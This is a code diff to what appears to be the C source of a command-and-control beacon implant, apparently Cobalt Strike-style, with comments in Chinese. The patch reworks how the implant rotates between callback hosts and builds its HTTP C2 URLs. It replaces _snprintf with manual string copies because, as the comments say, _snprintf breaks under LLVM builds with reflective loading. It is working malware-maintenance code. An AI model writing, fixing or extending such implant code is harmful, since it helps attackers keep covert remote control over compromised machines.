@@ -194,16 +194,13 @@ void beacon(LPVOID lpReserved) {
 		/* 4.10 beacon_config host 热换：覆盖层接管后每周期从这里取
 		 * host/uri（round-robin 跳 held）；未接管时走烘焙 strategy 路径 */
 		if (!hostcfg_pick(beacon_domain, 128, url, 256)) {
-#ifdef BW_PLAIN_SLEEP
+			/* _snprintf 家族在 LLVM+反射组合下踩栈（miniprintf 取证）；%s 单参
+			 * 场景手工拷贝在双工具链下等价且更快，永久取代 #ifdef 分叉 */
 			{ char * d_; const char * s_;
 			  d_ = beacon_domain; s_ = next_host(hosts, failedHost, &strategyInfo);
 			  { size_t n_ = 0; while (*s_ && n_ < 127) { *d_++ = *s_++; n_++; } *d_ = 0; }
 			  d_ = url; s_ = next_host(hosts, failedHost, &strategyInfo);
 			  { size_t n_ = 0; while (*s_ && n_ < 127) { *d_++ = *s_++; n_++; } *d_ = 0; } }
-#else
-			_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
-			_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
-#endif
 		}
 		failedHost = FALSE;
 
@@ -236,15 +233,9 @@ void beacon(LPVOID lpReserved) {
 		/* 使用HTTP通信输出 */
 		post_type = POST_HTTP;
 
-		/* 创建URL */
-#ifdef BW_PLAIN_SLEEP
-		/* LLVM A/B：_snprintf 家族在 LLVM+反射组合下踩栈（见 miniprintf 取证），
-		 * %s 单参场景直接手工拷贝等价替换 */
+		/* 创建URL（同上：%s 单参手工拷贝取代 _snprintf） */
 		{ char * d_ = post_url; const char * s_ = submit; size_t n_ = 0;
 		  while (*s_ && n_ < 255) { *d_++ = *s_++; n_++; } *d_ = 0; }
-#else
-		_snprintf(post_url, 256, "%s", submit);
-#endif
 
 		/* 执行协议的HTTP部分 */
 		// dlog("beacon.beacon - http_init: %s \n", beacon_domain);
